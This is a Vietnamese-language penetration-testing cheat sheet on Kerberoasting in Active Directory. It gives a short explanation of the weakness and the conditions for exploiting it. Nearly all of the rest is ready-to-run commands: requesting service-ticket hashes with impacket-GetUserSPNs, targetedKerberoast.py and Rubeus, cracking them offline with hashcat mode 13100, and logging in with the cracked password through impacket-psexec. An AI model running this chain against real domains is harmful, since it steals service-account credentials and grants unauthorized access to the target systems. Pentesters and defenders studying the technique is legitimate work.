# Kerberoasting

## Điểm chính khai thác

* **Lỗ hổng:** Tài khoản dịch vụ với SPN (như MSSQL, HTTP) có mật khẩu yếu.
* Tác động: Lấy hash TGS-REP, crack offline để lấy mật khẩu cleartext.
* Điều kiện khai thác
  * Tài khoản người dùng domain hợp lệ (không cần quyền admin).
  * Tài khoản dịch vụ có SPN trong Active Directory.

## Kiểm tra lỗ hổng

### Liệt kê tất cả SPN

Tìm các SPN do người dùng tạo ra qua bloodhound

### Kiểm tra từng SPN

Xác định SPN liên kết với tài khoản dịch vụ:

```
impacket-GetUserSPNs -dc-ip <ip> <domain>/<user>:<password> -request
```

## Tấn công từ xa

### Thu thập TGS-REP

Lấy hash TGS-REP từ SPN trong domain:

{% code overflow="wrap" %}

```
impacket-GetUserSPNs -dc-ip <ip> <domain>/<user>:<password> -request -outputfile tgs.txt
```

{% endcode %}

{% code overflow="wrap" %}

```
python3 targetedKerberoast.py -d test.local -u john -p password123 --dc-ip 10.10.10.1 --no-abuse -o tgs.txt
```

{% endcode %}

### Crack hash

Crack hash TGS-REP để lấy mật khẩu cleartext:

```
hashcat -m 13100 tgs.txt <wordlist>
```

## Tấn công nội bộ

### Thu thập TGS-REP

Lấy hash TGS-REP từ SPN trong domain:

```
Rubeus.exe kerberoast /outfile:tgs.txt
```

### Crack hash

Crack hash TGS-REP để lấy mật khẩu cleartext:

```
hashcat -m 13100 tgs.txt <wordlist>
```

## Kiểm tra kết quả

### Lệnh

Kiểm tra mật khẩu cleartext sau khi crack:

```
hashcat -m 13100 tgs.txt <wordlist> --show
```

### Xác nhận

Dùng mật khẩu lấy được để truy cập hệ thống mục tiêu:

```
impacket-psexec <domain>/<service_account>:<password>@<ip>
```
